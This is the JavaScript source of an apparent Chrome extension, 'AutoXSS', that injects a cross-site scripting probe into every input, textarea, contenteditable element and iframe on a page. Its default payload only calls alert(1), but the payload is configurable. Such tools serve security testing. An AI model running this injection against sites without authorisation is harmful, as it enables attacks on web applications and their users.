chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "fill-with-payload",
    title: "AutoXSS",
    contexts: ["page", "frame", "selection"]
  });
});

chrome.contextMenus.onClicked.addListener(async (info, tab) => {
  if (info.menuItemId === "fill-with-payload" && tab && tab.id) {
    await fillActiveTab(tab.id);
  }
});

chrome.commands.onCommand.addListener(async (command) => {
  if (command === "fill-page") {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (tab && tab.id) await fillActiveTab(tab.id);
  }
});

async function fillActiveTab(tabId) {
  const { payload } = await chrome.storage.sync.get({ payload: defaultPayload() });
  try {
    await chrome.scripting.executeScript({
      target: { tabId, allFrames: true },
      func: injectFill,
      args: [payload]
    });
  } catch (e) {
    console.error("xss autofill injection failed", e);
  }
}

function defaultPayload() {
  return `\"><img src=x onerror=alert(1)>`;
}


function injectFill(payload) {
  const ev = () => new Event("input", { bubbles: true });
  const ch = () => new Event("change", { bubbles: true });

  const isFillable = (el) => {
    if (!el || el.disabled || el.readOnly) return false;
    const tag = el.tagName?.toLowerCase();
    if (tag === "textarea") return true;
    if (tag === "input") {
      const t = (el.type || "text").toLowerCase();
      
      const bad = new Set(["file", "date", "datetime-local", "month", "week", "time", "color", "range", "hidden"]);
      if (t === "password") return true; // set to false if you wanna skip pw fields 
      return !bad.has(t);
    }
    return false;
  };

  const setVal = (el, val) => {
    const tag = el.tagName?.toLowerCase();
    if (tag === "textarea" || tag === "input") {
      el.focus({ preventScroll: true });
      el.value = val;
      el.dispatchEvent(ev());
      el.dispatchEvent(ch());
    }
  };

  const fillContentEditable = (root) => {
    const nodes = root.querySelectorAll("[contenteditable=true], [contenteditable=\"\"]");
    for (const n of nodes) {
      if (n.isContentEditable) {
        n.focus({ preventScroll: true });
        try {
          // try innerHTML to simulate real xss sinks; fallback to textContent
          n.innerHTML = payload;
        } catch (_) {
          n.textContent = payload;
        }
      }
    }
  };


  const inputs = Array.from(document.querySelectorAll("input, textarea")).filter(isFillable);
  inputs.forEach((el) => setVal(el, payload));
  fillContentEditable(document);


  for (const f of document.querySelectorAll("iframe")) {
    try {
      const d = f.contentDocument; 
      if (d) {
        const innerInputs = Array.from(d.querySelectorAll("input, textarea")).filter(isFillable);
        innerInputs.forEach((el) => setVal(el, payload));
        fillContentEditable(d);
      }
    } catch (_) {

    }
  }

  // try to tick any onsubmit validators by touching forms
  for (const form of document.forms) {
    form.dispatchEvent(new Event("input", { bubbles: true }));
    form.dispatchEvent(new Event("change", { bubbles: true }));
  }
}